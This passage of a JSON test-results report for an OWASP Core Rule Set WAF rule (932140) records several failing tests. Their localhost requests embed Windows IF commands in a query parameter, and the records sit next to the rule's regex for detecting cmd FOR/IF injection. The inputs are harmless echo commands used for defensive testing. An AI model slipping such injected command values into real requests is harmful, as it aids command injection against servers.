    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 88,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 88,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF++++++++%25ERRORLEVEL%25+GTR+2+++++echo+test",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 89,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 89,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF++++++++%25ERRORLEVEL%25+GEQ+2+++++echo+test",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 90,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 90,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF++++++++%25VARIABLE%25+++GTR+0+++++Echo+An+error+was+found",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 91,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 91,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF++++++++%25VARIABLE%25+++LSS+0+++++Echo+An+error+was+found",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
